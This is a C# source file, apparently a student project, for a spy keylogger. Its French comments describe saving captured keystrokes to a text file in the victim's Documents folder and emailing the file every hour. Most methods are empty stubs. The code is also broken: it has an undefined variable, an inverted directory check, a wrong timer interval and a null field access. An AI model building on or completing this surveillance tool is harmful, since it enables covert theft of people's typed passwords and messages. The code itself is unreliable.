using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using System.Xml.Serialization;
using System.Net;
using System.Net.Mail;

namespace ProjetEspionKeyLogger
{
    class KeyLogger
    {   
        //Texte saisie depuis le dernier clic ou, touche "entré", ou temps > 30 seconde
        private Enregistrement enregistrement_courrant;
        //Timer qui permet de gerer l'envoit des mails (toutes les 60 minutes)
        private Timer timer_mail;

        //Constructeur(peut etre pas nécessaire)
        public KeyLogger()
        {
            
            
            //Affiche la date du jour
            Console.WriteLine(enregistrement_courrant.dateTimeNow());
        }

        //Méthode permettant de démarrer le timer d'envoie des mails
        public void demarrerTimerMail()
        {
            timer_mail = new Timer()
            {
                //Toute les heures
                Interval = 60000000
            };

            //!!! PROVISOIR EN ATTENDANT DE COMPRENDRE !!!
            timer_mail.Tick += Timer_Tick;
        }

        //Boucle qui va toutes les X seconde, écrire dans un fichier txt
        private void demarrerTimerEnregistrement()
        {

        }

        //!!! PROVISOIR EN ATTENDANT DE COMPRENDRE !!!
        private void Timer_Tick(object sender, EventArgs e)
        {
            //Envoyer le mail
        }


        //Méthode qui écrit la saisie dans un .txt
        private void enregistreTxt()
        {

            //chemin dynamique car on l'enregistre sur l'ordinateur de la victime
            string chemin_Dossier = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            //Si la victime n'a pas de dossier "mes documents" alors on en crée un
            if (Directory.Exists(chemin_Dossier))
            {
                Directory.CreateDirectory(chemin_Dossier);
            }

            //Création du fichier texte
            using (StreamWriter sw = File.CreateText(chemin_Dossier + @"\CaptureClavier.txt"))
            {

            }

            //Ecriture
            using (StreamWriter sw = File.AppendText(chemin_Dossier + @"\CaptureClavier.txt"))
            {
                sw.Write(texte);

            }
        }


        //Envoyer le txt pr mail ?
        private void envoieMail()
        {

        }

        //sauvegarde dans un fichier XML
        public void saveToXml(string nomFichier)
        {
           /* FileStream file = File.Open(nomFichier, FileMode.Create);
            XmlSerializer serializer = new XmlSerializer(typeof(ListeEmployes));
            serializer.Serialize(file, this);
            file.Close();*/
        }


    }
}
